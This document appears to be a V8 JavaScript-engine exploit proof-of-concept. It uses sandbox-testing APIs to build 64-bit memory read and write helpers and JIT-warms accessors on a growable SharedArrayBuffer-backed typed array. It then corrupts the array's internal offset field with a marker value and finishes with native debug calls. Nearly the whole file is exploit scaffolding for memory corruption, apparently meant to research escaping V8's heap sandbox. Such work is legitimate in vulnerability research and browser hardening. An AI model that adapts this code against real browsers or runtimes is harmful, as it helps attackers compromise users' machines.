/// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/jsarray_test.js
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
return sandboxMemory.setBigInt64(Number(addr), val, true);
}


const gsab = new SharedArrayBuffer(4,{"maxByteLength":0x4242});
const u16arr = new Uint16Array(gsab);

/// for writing
function foo(obj, index, val){
    obj[index] = val;
    return obj[index];
}

function test(iii, val){
    return foo(u16arr, iii, val);
}

// for reading
function foo2(obj, index){
    return obj[index];
}

function test2(iii){
    return foo2(u16arr, iii);
}

for (let i = 0; i < 0x10000; i++) {
    test(1, 0);
    test2(1);
}
let byte_offset_ofs = BigInt(addrOf(u16arr) + 0x17);
v8_write64(byte_offset_ofs+4n, 0x41414141n);


/// ===================================================================================

const buffer = new Uint8Array(0x100);
%DebugPrint(buffer);
%SystemBreak();